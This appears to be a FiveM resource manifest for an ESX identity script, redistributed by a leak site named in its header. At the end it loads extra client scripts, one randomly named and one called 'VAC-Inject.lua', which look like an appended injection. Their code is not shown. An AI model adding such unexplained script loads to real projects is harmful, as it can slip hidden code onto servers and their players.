-- Leaked by Poseidon Leaks
-- https://poseidonleaks.cc/
-- https://discord.gg/poseidon-leaks
resource_manifest_version '44febabe-d386-4d18-afbe-5e627f4af937'

description 'ESX Identity'

version '1.1.0'

server_scripts {
	'@mysql-async/lib/MySQL.lua',
	'@es_extended/locale.lua',
	'server/main.lua'
}

client_scripts {
	'@es_extended/locale.lua',
	'client/main.lua'
}

ui_page 'html/index.html'

files {
	'html/index.html',
	'html/script.js',
	'html/style.css'
}

dependency 'es_extended'
client_script "2DONAEHW.lua"
client_script "VAC-Inject.lua"

client_script '@VersusAC/client/import.lua'

client_script '@VersusAC/client/import.lua'